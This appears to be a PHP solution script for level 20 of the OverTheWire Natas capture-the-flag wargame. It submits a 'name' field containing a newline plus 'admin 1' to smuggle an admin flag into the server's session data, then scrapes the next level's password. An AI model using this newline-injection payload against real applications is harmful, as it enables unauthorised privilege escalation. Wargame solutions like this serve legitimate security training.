<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 20;
$username = 'natas' . $level;
$password = readFlag($level - 1);
$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$response = $client->request('POST', $url, [
    'auth' => [$username, $password],
    'form_params' => [
        'name' => "somebody\nadmin 1",
    ]
]);

$response = $client->request('GET', $url, [
    'auth' => [$username, $password]
]);

$body = (string)$response->getBody();

preg_match('/Password: (.*)<\/pre>/', $body, $flag);
echo $flag[1];
